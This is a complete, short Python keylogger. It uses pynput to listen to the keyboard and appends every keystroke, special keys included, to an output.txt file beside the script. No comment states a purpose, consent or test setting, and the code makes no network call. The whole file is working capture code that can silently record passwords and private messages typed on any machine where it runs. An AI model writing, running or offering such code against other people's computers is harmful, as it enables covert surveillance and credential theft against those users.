import os
from pynput import keyboard

# Get the script's directory
script_directory = os.path.dirname(os.path.abspath(__file__))

def on_press(key):
    try:
        # Convert the key to a string
        key_char = key.char
    except AttributeError:
        # Handle special keys
        key_char = str(key)

    # Save the output file in the script's directory
    file_path = os.path.join(script_directory, 'output.txt')
    with open(file_path, 'a') as f:
        f.write(key_char)

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
